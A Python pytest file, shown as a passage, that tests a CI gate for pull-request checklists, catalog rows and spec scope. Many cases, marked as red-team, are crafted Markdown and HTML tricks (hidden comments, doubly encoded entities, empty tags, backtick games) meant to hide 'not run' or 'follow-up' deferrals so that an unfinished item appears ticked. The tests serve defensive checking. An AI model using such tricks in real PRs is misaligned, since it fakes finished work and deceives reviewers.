        for second, r in judged(dones, lambda second: f"- [x] {one}\n{second}\n",
                                [f"- [ ] {o}" for o in others] + [f"- [x] {o}, follow-up PR" for o in others]):
            assert r.returncode == 1 and "more than one checkbox line" in r.stdout, (one, second, r.stdout)
    # a link straddling the item's end shows the reader something else, so the box does not carry it;
    # read as written, a box must not go on with the item's last word or a marker either
    for cut, box in (("ship step [", "ship step [follow](u)-up"), ("ship [fol", "ship [follow](u)-up"), ("ship [p", "ship [p](u)ending"),
                     ("ship [fol](pending", "ship [fol](pending)low-up"), ("ship *fol", "ship *follow*-up"),
                     ("ship `fol", "ship `follow`-up"), ("ship _pend", "ship _pending_"), ("ship *follow", "ship *follow*-up"),
                     ("ship *fol*", "ship *fol*low up"), ("ship *fol", "ship *fol<ins></ins>low*-up"),
                     ("ship *follow", "ship *follow<wbr>*-up"), ("the `tsc` build pass", "the `tsc` build pass<wbr>es"),
                     ("ship *follow", "ship *follow[]()*-up"), ("ship *fol", "ship *fol<??>low*-up"), ("ship *follow", "ship *follow<??>*-up"),
                     ("ship *fol", "ship *fol<?x>low*-up ?>"), ("ship *follow", "ship *follow<!-->*-up"), ("ship *fol", "ship *fol<!-->low*-up"),
                     ("publish the `v2` notes post", "publish the `v2` notes post<poned:>"), ("ship *fol", "ship *fol<low-up:>*"),
                     ("the `tsc` build pass", "the `tsc` build pass~~es~~"), ("ship *fol", "ship *fol~~low~~-up"),
                     ("the `tsc` build pass", "the `tsc` build pass<?x>es<?`?>"), ("ship *fol", "ship *fol<?x>low<?`?>*-up"),
                     ("the `tsc` build pass", "the `tsc` build pass<![CDATA[x]`]]>es"), ("ship *fol", "ship *fol![](i.png)low*-up"),
                     ("the `tsc` build pass", "the `tsc` build pass![x](i.png)es"),
                     ("the `deploy` job can roll back", "the `deploy` job can roll back[<ins></ins>](x)log"),
                     ("the `tsc` build passes, fol", "the `tsc` build passes, fol[<ins></ins>](x)low-up"),
                     ("the `tsc` build passes; fol", "the `tsc` build passes; fol[![](i.png)](x)low-up"),
                     ("the `deploy` job can roll back!", "the `deploy` job can roll back![](x)log")):
        on_base(repo, {SPEC: spec(done_when=[cut])})
        r = done(f"- [x] {box}\n")
        assert r.returncode == 1 and f"missing: {cut}" in r.stdout, (cut, r.stdout)
    # a plain item is read as main reads it: a count with markup stays a count (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the registry test passes"])})
    for tail, r in judged(dones, lambda tail: f"- [x] the registry test passes{tail}\n", (": 12 passed, **0** skipped", " (`12` passed, `0` skipped)", ": 12 passed, _0_ skipped")):
        assert r.returncode == 0, tail
    # the gate's own private-use markers, typed in the body, are no marker: no hidden deferral, no crash (red-team, this PR)
    for body, r in judged(dones, str, ("- [x] the registry test passes\n\ue0ff\n    pending follow-up\n", "- [x] the registry test passes\n  \ue0ff\n    not run\n")):
        assert r.returncode == 1 and "defers its work" in r.stdout, (body, r.stdout)
    for body, r in judged(dones, str, ("- [x] the registry test passes `x` \ue0fa9\ue0fa\n", "- [x] the registry test passes &#xe0fa;9&#xe0fa; `x`\n")):
        assert r.returncode == 0 and "Traceback" not in r.stderr, (body, r.stdout, r.stderr)
    # an item holding an entity for punctuation is carried by its verbatim box, at close-out too (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `tsc` exit code &lt; 2"])})
    assert ok("- [ ] the `tsc` exit code &lt; 2\n").returncode == 0
    assert done("- [x] the `tsc` exit code &lt; 2\n").returncode == 0
    assert done("- [x] the `tsc` exit code < 2\n").returncode == 0
    # a link in a box shows its text: the item is all a reader sees (red-team, this PR)
    for item, box in (("the registry test passes", "the [registry](docs/r.md) test passes"),
                      ("the CI job is green", "the CI [job](https://github.com/o/r/actions/runs/1) is green")):
        on_base(repo, {SPEC: spec(done_when=[item])})
        assert ok(f"- [ ] {box}\n").returncode == 0, box
        assert done(f"- [x] {box}\n").returncode == 0, (box, done(f"- [x] {box}\n").stdout)
    # a placeholder the item writes as a tag is carried by a box that shows it, as on main (red-team, this PR)
    for item, boxes in (("set <name> in the config", ("set `<name>` in the config", "set &lt;name&gt; in the config")),
                        ("Box<T> compiles", ("`Box<T>` compiles", "Box&lt;T&gt; compiles"))):
        on_base(repo, {SPEC: spec(done_when=[item])})
        for box in boxes:
            assert ok(f"- [ ] {box}\n").returncode == 0, box
            assert done(f"- [x] {box}\n").returncode == 0, (box, done(f"- [x] {box}\n").stdout)
    # a tag GitHub hides is not the text an item spells with entities, plain or with markup (red-team, this PR)
    for item in ("Shipped &lt;the migration verified&gt;", "`deploy` ships &lt;the migration verified&gt;", "List&lt;T&gt; serializes"):
        on_base(repo, {SPEC: spec(done_when=[item])})
        assert done(f"- [x] {item}\n").returncode == 0, item
        for box, r in judged(dones, lambda box: f"- [x] {box}\n", (item.replace("&lt;", "<").replace("&gt;", ">"), item.replace("&lt;", "*<").replace("&gt;", ">*"))):
            assert r.returncode == 1 and ("hides part of its item" in r.stdout or "missing" in r.stdout), (box, r.stdout)
    # an entity GitHub reads as text keeps an autolink whole, so the word goes on (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `tsc` build pass"])})
    r = done("- [x] the `tsc` build pass<es:&lt;x>\n")
    assert r.returncode == 1 and "the `tsc` build pass" in r.stdout, r.stdout
    # a copy written with an escaped tag or a no-break space inside one is text, as GitHub shows it (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `tsc` build passes"])})
    for copy in ("the &lt;tsc build&gt; passes (not run)", "the <tsc\u00a0build> passes (not run)", "the <tsc\u2003build> passes (not run)",
                 "the tsc build pa<sses<br>not run>"):
        for body, r in judged(dones, str, (f"- [ ] {copy}\n- [x] the `tsc` build passes\n", f"- [x] the `tsc` build passes\n- [ ] {copy}\n")):
            assert r.returncode == 1, (copy, body)
    # raw HTML from inside the item to past its end hides the item's own words, so the box does not carry it
    for item in ("`cmp` holds when a<c and the result is negative", "cmp holds when a<c and the result is negative"):
        on_base(repo, {SPEC: spec(done_when=[item])})
        r = done(f"- [x] {item}>\n")
        assert r.returncode == 1 and f"missing: {item}" in r.stdout, (item, r.stdout)
        assert done(f"- [x] {item}\n").returncode == 0
    # the longer item is the longer one a reader sees, not one with a long hidden link (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["[run the tests](https://ci.example.com/o/r/pipelines/main)", "run the tests on 3.12"])})
    r = done("- [x] [run the tests](https://ci.example.com/o/r/pipelines/main) on 3.12\n- [x] run the tests on 3.12\n")
    assert r.returncode == 1 and "more than one checkbox line for: run the tests on 3.12" in r.stdout, r.stdout
    assert done("- [x] [run the tests](https://ci.example.com/o/r/pipelines/main)\n- [x] run the tests on 3.12\n").returncode == 0
    # read once too, the longer item still claims its own line first (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["run the tests", "run the tests on 3.12"])})
    for tail, r in judged(dones, lambda tail: f"- [x] run the tests on 3.12\n- [x] run the tests{tail}\n", (" (R&amp;D sign-off)", " (p &lt; 0.05)", "<br>", " <b>green</b>")):
        assert r.returncode == 0, tail
    # a spacer line before an indented one splits both readings alike: no refusal (red-team, this PR)
    for spacer in ("&nbsp;", "<br>", "<kbd>x</kbd>", "&lt;b&gt;"):
        body = f"- [x] run the tests on 3.12\n    {spacer}\n    ran locally\n- [x] run the tests\n"
        assert done(body).returncode == 0, (spacer, done(body).stdout)
    # both readings take main's indented code line for line: a whitespace-only line, or one an HTML block
    # main ends at a no-break space holds, moves no line (red-team, this PR)
    for body, r in judged(dones, lambda body: "- [x] run the tests on 3.12\n" + body, ("- [x] run the tests\n\t\n&lt;b&gt;\n    ran locally\n", "- [x] run the tests\n</div>\n&nbsp;\n    ran locally\n",
                 "- [x] run the tests\n<div>\n    &nbsp;\n    ran locally\n")):
        assert r.returncode == 0, (body, r.stdout)
    # items sharing a copy key against a long body are refused within a budget, not timed out (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["`a`" + "." * k for k in range(1, 31)])})
    r = ok("- [x] a.\n" * 4000)
    assert r.returncode == 1 and "line lookups" in r.stdout, r.stdout[-400:]
    # the budget is the check's, over every index it builds, not each index's (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["`a`" + "!" * k for k in range(1, 13)])})
    r = ok("- [x] a\n" * 8160)
    assert r.returncode == 1 and "line lookups" in r.stdout, r.stdout[-400:]
    # each box claims its own item: a link target or a trailing marker tells two items apart (solyra#228 r4207718706)
    on_base(repo, {SPEC: spec(done_when=["[workflow](a.yml) passes", "[workflow](b.yml) passes", "config FOO_", "config FOO"])})
    assert ok("- [ ] [workflow](b.yml) passes\n- [ ] [workflow](a.yml) passes\n- [ ] config FOO_BAR set\n- [ ] config FOO\n").returncode == 0
    # a reader's copy of a link item never carries it, as on main (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["[npm test](package.json) passes", "npm test passes on node 22"])})
    assert ok("- [ ] [npm test](package.json) passes\n- [ ] npm test passes on node 22\n").returncode == 0
    for two, r in judged(oks, str, ("- [ ] npm test passes\n- [ ] npm test passes on node 22\n", "- [ ] npm test passes on node 22\n- [ ] npm test passes\n")):
        assert r.returncode == 1 and "missing: [npm test](package.json) passes" in r.stdout, (two, r.stdout)
    # an entity or a dash reads as the body reads it, once (solyra#228 r4207718694, red-team)
    on_base(repo, {SPEC: spec(done_when=["R&amp;D signs the step \u2013 done"])})
    assert ok("- [ ] R&amp;D signs the step \u2013 done\n").returncode == 0
    # a tag stays in the item, so no other tag, or none, stands in for it (red-team, this PR)
    for tagged, boxes in (("Ship<span title=' the migration verified'>", ["Shipped the README typo fix"]),
                          ("`<kbd>` hints show the shortcut", ["`<sub>` hints show the shortcut", "`` hints show the shortcut"]),
                          ("**", ["**bold claim** done"])):
        on_base(repo, {SPEC: spec(done_when=[tagged])})
        for box in boxes:
            r = ok(f"- [x] {box}\n")
            assert r.returncode == 1 and f"missing: {tagged}" in r.stdout, (tagged, box, r.stdout)
    # an item cut at `<!--` is not a stub that ticks an unrelated box (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["strip <!-- markers from the PR template"])})
    r = ok("- [ ] strip trailing whitespace\n")
    assert r.returncode == 1 and "missing: strip <!--" in r.stdout, r.stdout
    # a long `[` run renders in linear time and its verbatim copy matches; an item whose reference Python
    # cannot read keeps it literal and is missing, as on main (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["[" * 20000 + " [ship](u) it"])})
    assert ok("- [x] " + "[" * 20000 + " [ship](u) it\n").returncode == 0
    on_base(repo, {SPEC: spec(done_when=["z &#" + "1" * 4301 + ";"])})
    r = ok("- [x] z\n")
    assert r.returncode == 1 and "missing: z &#" in r.stdout, r.stdout[-300:]
    on_base(repo, {SPEC: spec(done_when=[f"item {k} " + "y" * 7000 for k in range(10)])})
    r = ok("- [x] item 0 y\n")
    assert r.returncode == 1 and "more than a PR body can hold" in r.stdout, r.stdout[-300:]
    on_base(repo, {SPEC: spec(done_when=[f"i{k}" for k in range(8193)])})
    r = ok("- [x] i0\n")
    assert r.returncode == 1 and "more checkbox lines than a PR body can hold" in r.stdout, r.stdout[-300:]
    # an entity encoded twice still reads as its word for a deferral or a second line, as main read it
    on_base(repo, {SPEC: spec(done_when=["every model states its decision"])})
    for two, r in judged(dones, str, ("- [x] every model states its decision, n&amp;#111;t run\n",
                "- [x] every model states its decision\n- [ ] every model &amp;#115;tates its decision (not run)\n",
                "- [x] every model states its decision [see](\n  n&amp;#111;t run)\n",
                "- [x] every model states its decision&amp;#10;- [ ] every model states its decision\n",
                "- [x] every model states its decision follow<<b></b>b>-up\n",
                "- [x] every model states its decision\n" + "\n" * 20000 + "  not run\n",   # still the loose item past 20,000 blank lines
                # main's reading joins the box to the line below
                "- [x] every model states its decision <!<b></b>--\n\n--> not run\n",
                # a line that reads as a list item only once decoded keeps no box from the deferral check
                "&amp;lt;!--\n&amp;#45; [ ] notes --&amp;gt;\n  - [x] every model states its decision, n&amp;#111;t run\n",
                "- &amp;#91; ] notes\n  - [x] every model states its decision, n&amp;#111;t run\n",
                *(f"{above}\n\n- [x] every model states its decision, n&amp;#111;t run\n"
                  for above in ("&amp;lt;!--", "&amp;lt;pre&amp;gt;", "&amp;#96;" * 3)))):
        assert r.returncode == 1 and ("defers its work" in r.stdout or "more than one checkbox line" in r.stdout), (two, r.stdout)
    # decided on the body read twice, as on main: there a backtick that paired with one in a later code block
    # hides no comment, and a tag line after a closed fence opens its HTML block (red-team, this PR)
    for hidden, r in judged(dones, str, ("Escape the ` in shell strings.\n\n<!--\n- [x] every model states its decision\n-->\n\n```bash\nnpm test\n```\n",
                   "```\nnpm test\n```\n<img alt=\"image\" src=\"https://example.com/a.png\">\n- [x] every model states its decision\n",
                   *(f"{above}\n\n- [x] every model states its decision, n&amp;#111;t run\n" for above in ("<!\u2010\u2010", "<!<b></b>--")))):
        assert r.returncode == 1 and "missing: every model states its decision" in r.stdout, (hidden, r.stdout)
    assert done("Escape the ` in shell strings.\n- [x] every model states its decision\n\n<!--\n- [ ] every model states its decision\n-->\n\n"
                "```bash\nnpm test\n```\n").returncode == 0
    # a line GitHub shows that only the twice-read body hides, behind an entity it decodes again, is a second line
    # for its item (red-team, this PR)
    # or tags (`<!<b></b>--`, `<<b></b>pre>`) it strips (red-team, this PR)
    for two, r in judged(dones, str, (f"- [x] every model states its decision\n\n{wrap}\n\n{copy}\n\n{end}\n"
                                      for wrap, end in (("&amp;lt;!--", "--&amp;gt;"), ("&amp;#96;" * 3, "&amp;#96;" * 3), ("<!<b></b>--", "--<b></b>>"),
                                                        ("<!<span></span>--", "--<span></span>>"), ("<<b></b>pre>", "<<b></b>/pre>"))
                                      for copy in ("- [ ] every model states its decision (not run)", "- [x] every model states its decision, follow-up PR"))):
        assert r.returncode == 1 and ("more than one checkbox line" in r.stdout or "defers its work" in r.stdout), (two, r.stdout)
    # the close-out ticks the box the body read once shows first, as on main (red-team, this PR)
    r = done('Notes [a](u "<!<!-- -->--").\n\n- [ ] every model states its decision\n\nRef [b](v "-->").\n\n- [x] every model states its decision\n')
    assert r.returncode == 1 and "not ticked: every model states its decision" in r.stdout, r.stdout
    # the first line a reader takes as a markup item is the close-out's too, its copy included, wherever the
    # body read twice hides it: it must be ticked and must not defer (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `tsc` build passes"])})
    # raw HTML reads as cmark-gfm 0.29.0.gfm.13 passes it through and an HTML parser then shows it: a processing
    # instruction up to its first `>`, a lower-case declaration as text, an autolink as its text; raw HTML whose
    # text the gate cannot tell, a quote left open in it or CDATA inside svg, is refused (red-team, this PR)
    for (first, why), r in judged(dones, lambda case: f'<img alt="i" src="a.png"> <br>\n{case[0]}\n\n- [x] the `tsc` build passes\n', (
                       ("- [ ] the <code>tsc</code> build passes", "not ticked"), ("- [x] the <code>tsc</code> build passes, not run", "defers its work"),
                       ("- [ ] the t<?x?>sc build passes (not run)", "not ticked"), ("- [ ] the t<?x>sc build passes (not run) ?>", "not ticked"),
                       ("- [x] the t<!X y>sc build passes, not run", "defers its work"),
                       ("- [x] the t<![CDATA[x]]>sc build passes, not run", "defers its work"),
                       ("- [ ] the <!tsc build passes (not run)>", "not ticked"),
                       ("- [ ] the t<?x><y a='?>'z<!--->sc build passes (not run)", "cannot read"),
                       ("- [ ] the t<?sc@build.passes> (not run) ?>", "not ticked"),
                       ("- [ ] <svg><![CDATA[the tsc build passes]]></svg> (not run)", "cannot read"))):
        assert r.returncode == 1 and why in r.stdout, (first, r.stdout)
    assert done('<img alt="i" src="a.png"> <br>\n- [ ] the t<!x>sc build passes (not run)\n\n- [x] the `tsc` build passes\n').returncode == 0
    # an escaped backslash leaves the `<` after it a tag (red-team, this PR)
    for body, r in judged(dones, str, ("- [x] the `tsc` build passes\n- [ ] the t\\\\<ins>sc build passes (not run)\n",
                 '<img alt="i" src="a.png"> <br>\n- [ ] the t\\\\<ins>sc build passes (not run)\n\n- [x] the `tsc` build passes\n',
                 "- [x] the t\\\\<ins>sc build passes, not run\n")):
        assert r.returncode == 1, body
    on_base(repo, {SPEC: spec(done_when=["<p> tags are stripped from summaries", "the `tsc` build passes"])})
    assert done("- [x] <p> tags are stripped from summaries\n- [x] the `tsc` build passes\n").returncode == 0
    # each tag after an item read as written is parsed once: 26 `<img src=a/>` took minutes (red-team, this PR)
    # (and refused: tags with attributes after a done item with markup are no plain words, red-team, this PR)
    r = done("- [x] <p> tags are stripped from summaries\n- [x] the `tsc` build passes" + "<img src=a/>" * 26 + "!\n")
    assert r.returncode == 1 and "cannot read for a deferral" in r.stdout, r.stdout
    for two, r in judged(dones, str, ("- [x] <p> tags are stripped from summaries, n&amp;#111;t run\n- [x] the `tsc` build passes\n",
                "- [x] <p> tags are stripped from summaries\n- [x] the `tsc` build passes\n- [ ] the `tsc` build p&amp;#97;sses (not run)\n")):
        assert r.returncode == 1 and ("defers its work" in r.stdout or "more than one checkbox line" in r.stdout), (two, r.stdout)
    # each position after an item is walked once, however many items are weighed against the line (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["*a" + "<a>" * k for k in range(208)])})
    r = done("- [ ] x &amp;#111;\n- [x] *a" + "<a>" * 21000 + "`\n")
    assert r.returncode == 1 and "missing: *a" in r.stdout, r.stdout[-300:]
    # a tag in an item's code span is text, as it renders, so a plain copy of the item is one of its lines (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `<Dialog>` closes on Escape"])})
    r = done("- [x] the `<Dialog>` closes on Escape\n- [ ] the Dialog closes on Escape (not run)\n")
    assert r.returncode == 1 and "more than one checkbox line" in r.stdout, r.stdout
    # a backtick in an image's destination is part of it on GitHub, which the gate does not pair: refused
    # (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["ship `x` done"])})
    for body, r in judged(dones, str, ("- [x] ship `x` done\n- [ ] ship ![](a`b.png) `x` done (not run)\n",
                 "- [ ] ship ![](a`b.png) `x` done (not run)\n- [x] ship `x` done\n")):
        assert r.returncode == 1 and "backtick inside a link or image destination" in r.stdout, (body, r.stdout)
    assert done("- [x] ship `x` done ([log](https://ci.example.com/1))\n").returncode == 0
    # an image in a code span is text too: a plain copy of the item is one of its lines (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `![badge](b.svg)` markup renders"])})
    r = done("- [x] the `![badge](b.svg)` markup renders\n- [ ] the \\!\\[badge\\](b.svg) markup renders (not run)\n")
    assert r.returncode == 1 and "more than one checkbox line" in r.stdout, r.stdout
    assert done("- [x] the `![badge](b.svg)` markup renders\n").returncode == 0
    # and so is a link or image in a code span: its destination shows too (red-team, this PR)
    for item, copy in (("the `xy` syntax renders", "the `[x](y)` syntax renders"), ("the `xipng` syntax renders", "the `![x](i.png)` syntax renders")):
        on_base(repo, {SPEC: spec(done_when=[item])})
        r = done(f"- [x] {item}\n- [ ] {copy}\n")
        assert r.returncode == 1 and "more than one checkbox line" in r.stdout, (copy, r.stdout)
    on_base(repo, {SPEC: spec(done_when=["the `<Dialog>` closes on Escape"])})
    # raw HTML in a code span is text, so it never makes a line unreadable (red-team, this PR)
    assert done("- [x] the `<Dialog>` closes on Escape\n- [x] `<svg>` icons keep their `<![CDATA[...]]>` styles\n").returncode == 0
    # a tilde after a done item with markup pairs with one in the item, striking through across its end (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `tsc` build takes ~2 min"])})
    for tail, r in judged(dones, lambda tail: f"- [x] the `tsc` build takes ~2 min{tail}\n", (", pend~ing review", ", fol~low-up", ", see log~")):
        assert r.returncode == 1 and "cannot read for a deferral" in r.stdout, (tail, r.stdout)
    for tail, r in judged(dones, lambda tail: f"- [x] the `tsc` build takes ~2 min{tail}\n", ("", " (`a~b` passed)", " in CI")):
        assert r.returncode == 0, tail
    # every reading of a body shares main's code span scan, however long an entity is written: the twice-read body
    # read again with its entities as written rescanned a joined backtick run, twice main's time (red-team, this PR)
    sys.path.insert(0, str(REPO / "scripts/gate"))
    import spec_gate
    spec_gate.backtick_spans.cache_clear()
    assert spec_gate.code_span_places("xx`xxx`x``x") == ((2, 7), (8, 10))
    assert spec_gate.code_span_places("x`xxxxxxx`xxxx``x") == ((1, 10), (14, 16))
    assert spec_gate.backtick_spans.cache_info().misses == 1
    # a backtick inside a tag's attribute opens no code span, as raw HTML comes first, and one that opens none
    # stays, so `<sc`>` is text (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `tsc` build passes"])})
    for first, r in judged(dones, lambda first: f"{first}\n- [x] the `tsc` build passes\n", ('- [ ] the <a title="`">tsc</a> build passes <a title="`"></a>(not run)',
                  '- [x] the <a title="`">tsc</a> build passes, not run <a title="`"></a>',
                  "- [ ] the t<sc`> build passes (not run)", "- [x] the t<sc`> build passes, not run")):
        assert r.returncode == 1 and ("more than one checkbox line" in r.stdout or "defers its work" in r.stdout), (first, r.stdout)
    # raw HTML that shows nothing does not split a deferral word (red-team, this PR)
    for line, r in judged(dones, lambda line: f"- [x] {line}\n", ("the `tsc` build passes, fol<ins></ins>low-up PR", "the `tsc` build passes, fol<?x?>low-up PR",
                 "the `tsc` build passes (not<ins> </ins>run)")):
        assert r.returncode == 1 and "defers its work" in r.stdout, (line, r.stdout)
    # a code span opening the line is read from the line's start, not around past it (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["`npm test` passes"])})
    r = done("- [ ] `npm`-test passes ``\n- [x] `npm test` passes\n")
    assert r.returncode == 1 and "more than one checkbox line" in r.stdout, r.stdout
    # an escaped backtick before a code span is text, and the span's own run is what renders as nothing (red-team, this PR)
    on_base(repo, {SPEC: spec(done_when=["the `tsc` build passes"])})
    r = done("- [x] the `tsc` build passes\n- [ ] \\``t`he tsc build passes (not run)\n")
    assert r.returncode == 1 and "more than one checkbox line" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(done_when=["escape &amp;lt; in docs"])})
    r = done("- [x] escape &amp;lt; in docs, n&amp;#111;t run\n")
    assert r.returncode == 1 and "defers its work" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec(done_when=["R&amp;amp;D signs off"])})
    r = done("- [x] R&amp;amp;amp;D signs off\n- [ ] R&amp;amp;D signs off\n")
    assert r.returncode == 1, r.stdout


def test_the_pr_number_goes_in_the_prs_cell(repo):
    """solyra#72 r4118418395 (spec_gate.py:658).

    Any added row text holding the FEAT-ID and `#N` satisfied the solyra
    close-out, so the number could sit in Top blockers while PRs stayed `none`.
    The PRs cell of the FEAT's row must carry the number.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    wrong_cell = CATALOG_TEXT.replace("| [FEAT-MODEL-001](#feat-model-001) | Models | Production | unknown | none |",
                                      f"| [FEAT-MODEL-001](#feat-model-001) | Models (#42) | Production | {TODAY} | none |")
    r = pr(repo, BRANCH, {**CODE, PLAN: plan(pr=42), CATALOG: wrong_cell}, **meta)
    assert r.returncode == 1 and "row's PRs column (it reads 'none')" in r.stdout, r.stdout


def test_other_product_documents_and_specs_do_not_change_with_code(repo):
    """solyra#72 r4118418393 and stocks#1205 r4118420386 (spec_gate.py:554): canvases.yml
    and every other docs/product/ file except the FEAT's own records, the model
    registry and its generated files are refused on a feature change. solyra#72
    r4118418403 (:379): so is any spec other than the plan's, added or edited.
    """
    ok = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body()}
    r = pr(repo, BRANCH, {**CODE, "docs/product/canvases.yml": "canvases: []\n"}, **ok)
    assert r.returncode == 1 and "docs/product/canvases.yml changes in this feature change" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, "docs/product/13-ROADMAP.md": "# Roadmap\n"}, **ok)
    assert r.returncode == 1 and "13-ROADMAP.md changes in this feature change" in r.stdout, r.stdout
    on_base(repo, {SPEC: spec() + "\nThis spec changes MODEL-X-001.\n", "docs/product/07-MODEL-REGISTRY.md": "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-X-001 | Draft |\n"})
    assert pr(repo, BRANCH, {**CODE, "docs/product/07-MODEL-REGISTRY.md": "# Registry\n\n| ID | Status |\n|---|---|\n| MODEL-X-001 | Production |\n",
                             "docs/product/generated/model-registry.json": "{}\n"}, **ok).returncode == 0
    on_base(repo, {SPEC: spec(), "docs/product/07-MODEL-REGISTRY.md": None})
    # solyra#72 r4118481048: the registry allowance is two exact paths, not two prefixes
    r = pr(repo, BRANCH, {**CODE, "docs/product/07-MODEL-REGISTRY.md.backup": "x\n"}, **ok)
    assert r.returncode == 1 and "07-MODEL-REGISTRY.md.backup changes in this feature change" in r.stdout, r.stdout
    r = pr(repo, BRANCH, {**CODE, "docs/product/generated/extra.json": "{}\n"}, **ok)
    assert r.returncode == 1 and "generated/extra.json changes in this feature change" in r.stdout, r.stdout
    other = "docs/superpowers/specs/2026-09-28-other.md"
    r = pr(repo, BRANCH, {**CODE, other: spec(feat_id="FEAT-DATA-001", req_ids="[REQ-DATA-001]")}, **ok)
    assert r.returncode == 1 and f"spec(s) change alongside code ({other})" in r.stdout, r.stdout


def test_policy_documents_are_read_at_the_current_base(repo):
    """solyra#72 r4118418406 (spec_gate.py:743, P1).

    The catalog and the approved spec were read at the merge base, so a spec
    superseded on main after the branch forked was still honoured. They are
    read at the PR's current base; the diff is still taken from the merge base.
    """
    _git(repo, "checkout", "-q", "-B", BRANCH, "base")
    write(repo, "lib/model.py", CODE["lib/model.py"])
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "implementation on the old spec")
    newer = "docs/superpowers/specs/2026-09-20-model-decisions-v2.md"
    _git(repo, "checkout", "-q", "main")
    write(repo, newer, spec(supersedes=SPEC))
    _git(repo, "add", "-A")
    _git(repo, "commit", "-q", "-m", "main supersedes the spec after the fork")
    r = gate(repo, "--pr", "main", BRANCH, PR_HEAD_REF=BRANCH, PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body())
    assert r.returncode == 1 and f"{SPEC} is superseded by {newer}" in r.stdout, r.stdout


def test_a_docs_only_feature_pr_is_still_scoped(repo):
    """stocks#1205 r4118475503 (spec_gate.py:329).

    A feature/ PR with no gated file returned before the product-scope check,
    so it could rewrite the requirements or another capability's record with
    no plan. The scope rules run on every feature/ or fix/ PR from its branch
    name alone.
    """
    r = pr(repo, BRANCH, {REQUIREMENTS: REQUIREMENTS_TEXT + "\n**REQ-MODEL-002:** Faster.\n"})
    assert r.returncode == 1 and "requirements change on their own docs/ branch" in r.stdout, r.stdout
    other = CATALOG_TEXT.replace("### FEAT-DATA-001\n\n- Status: Production", "### FEAT-DATA-001\n\n- Status: Retired")
    r = pr(repo, BRANCH, {CATALOG: other})
    assert r.returncode == 1 and "lines outside FEAT-MODEL-001's row and record change" in r.stdout, r.stdout
    assert pr(repo, BRANCH, {"docs/notes.md": "# Notes\n"}).returncode == 0


def test_the_lineage_entry_is_visible(repo):
    """stocks#1205 r4118475512 (spec_gate.py:693).

    Any added line in the FEAT's traceability section holding `#N` satisfied
    the close-out, so `<!-- #42 -->` or a prose mention passed. The number must
    be on a rendered `**PR lineage:**` line or a list item of that section.
    """
    meta = {"PR_TITLE": "FEAT-MODEL-001: x", "PR_BODY": body(ticked=True), "PR_NUMBER": "42", "PR_DRAFT": "false"}
    row = CATALOG_TEXT.replace("| Models | Production | unknown | none |", f"| Models | Production | {TODAY} | #42 |")
    base_trace = "# Traceability\n\n### FEAT-MODEL-001\n\n**PR lineage:** [#7](x) *origin*\n\n### FEAT-DATA-001\n\n- #1\n"
    on_base(repo, {TRACEABILITY: base_trace})
    files = {**CODE, PLAN: plan(pr=42), CATALOG: row}
    hidden = base_trace.replace("*origin*\n", "*origin*\n<!-- #42 -->\n")
    r = pr(repo, BRANCH, {**files, TRACEABILITY: hidden}, **meta)
    assert r.returncode == 1 and "PR lineage" in r.stdout, r.stdout
    prose = base_trace.replace("*origin*\n", "*origin*\n\nSee also #42 for context.\n")
    r = pr(repo, BRANCH, {**files, TRACEABILITY: prose}, **meta)
    assert r.returncode == 1 and "PR lineage" in r.stdout, r.stdout
    entry = base_trace.replace("*origin*\n", "*origin* \u00b7 [#42](y) *close-out*\n")
    assert pr(repo, BRANCH, {**files, TRACEABILITY: entry}, **meta).returncode == 0


def test_a_feature_pr_without_a_plan_fails_cleanly_when_ready(repo):
    """solyra#72 r4118525514 (spec_gate.py:809).

    After the docs-only scope fix, the plan and close-out checks ran whenever
    the branch shape matched, so a ready feature PR with no traced plan
    crashed on `None.plan_fm` in CI instead of printing what was missing.
    """
    r = pr(repo, "feature/feat-model-001-no-plan", CODE, PR_NUMBER="42", PR_DRAFT="false",
           PR_TITLE="FEAT-MODEL-001: x", PR_BODY=body(ticked=True))
    assert r.returncode == 1 and "no plan in docs/superpowers/plans names branch" in r.stdout, r.stdout + r.stderr
    assert "Traceback" not in r.stderr, r.stderr
    # since solyra#72 r4119610902 a feature branch is traced even with documentation only
    r = pr(repo, "feature/feat-model-001-no-plan", {"docs/notes.md": "# n\n"}, PR_NUMBER="42", PR_DRAFT="false")
    assert r.returncode == 1 and "no plan in docs/superpowers/plans names branch" in r.stdout, r.stdout + r.stderr
    assert "Traceback" not in r.stderr, r.stderr


def test_a_pull_request_targets_main_only(repo):
    """solyra#72 r4118525521 (spec-gate.yml:41).

    Only the base SHA reached the gate, so a PR stacked onto another branch
    was judged against that branch's catalog and specs as policy. CI passes
    PR_BASE_REF and the gate refuses any base but main.
    """
    r = pr(repo, BRANCH, CODE, PR_BASE_REF="feature/feat-model-001-parent")
    assert r.returncode == 1 and "targets 'feature/feat-model-001-parent'; pull requests here target main only" in r.stdout, r.stdout
    assert pr(repo, BRANCH, CODE, PR_BASE_REF="main").returncode == 0
    workflow = yaml.safe_load(WORKFLOW.read_text(encoding="utf-8"))
